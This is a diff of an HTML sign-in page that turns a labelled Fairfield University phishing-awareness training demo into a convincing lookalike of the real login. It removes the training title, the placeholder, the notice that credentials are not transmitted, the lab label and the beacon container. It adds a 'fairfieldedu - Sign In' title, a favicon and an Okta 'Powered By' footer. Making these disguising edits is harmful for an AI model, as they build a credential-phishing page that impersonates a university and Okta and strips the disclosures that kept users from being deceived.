@@ -3,10 +3,12 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Fairfield Cybersecurity — Login Training Demo</title>
+  <title>fairfieldedu - Sign In</title>
+  <link rel="icon" type="image/jpeg" href="favicon.jfif">
   <link rel="stylesheet" href="style.css">
 </head>
 <body>
+
 
   <header class="topbar">
     <div class="top-title">
@@ -24,12 +26,8 @@
         <img src="fairfield_shield.png" class="crest-img" alt="Fairfield University crest">
         <span class="brand-text">Fairfield University</span>
       </div>
-<br>
-        <br>
       <div class="divider-icon">
         <span class="line"></span>
-        <br>
-        <br>
         <div class="lock-circle" id="lockCircle" style="display:none">
           <img src="lock.png" alt="lock" class="lock-img">
         </div>
@@ -85,7 +83,7 @@
               name="password"
               type="password"
               autocomplete="current-password"
-              placeholder="Training demo only"
+    
               aria-describedby="privacy-note"
             >
             <button class="eye" id="togglePassword" type="button" aria-label="Show password">
@@ -99,12 +97,9 @@
 
           <button class="verify" id="loginBtn" type="submit">
             <span>Verify</span>
-            <span class="arrow">→</span>
           </button>
 
-          <p class="demo-note" id="privacy-note">
-            <span>🔒</span> This is a local training demo: credentials are not transmitted to any server.
-          </p>
+         
         </form>
           <nav class="links" aria-label="Training links">
             <a href="#" data-demo="Password recovery is disabled in this training demo.">Forgot password?</a>
@@ -116,18 +111,18 @@
 
       
 
-      <div class="training-label">FAIRFIELD CYBERSECURITY • PHISHING AWARENESS LAB</div>
-        <div data-type="beacon-container" class="beacon-container"></div>
+      
+      
     </section>
   </main>
 
   <footer class="footer">
-    <span>Training Environment</span>
-    <span>Privacy &amp; Safety</span>
-    <span>Help</span>
+    <span>Powered By <a href="https://www.okta.com/?internal_link=wic_login"> OKta </a></span>
+  
+    <span>Privacy Policy</span>
   </footer>
 
   <div class="toast" id="toast" role="status"></div>
-  <script src="script.js"></script>
+  <script src="script.js?v=5"></script>
 </body>
 </html>
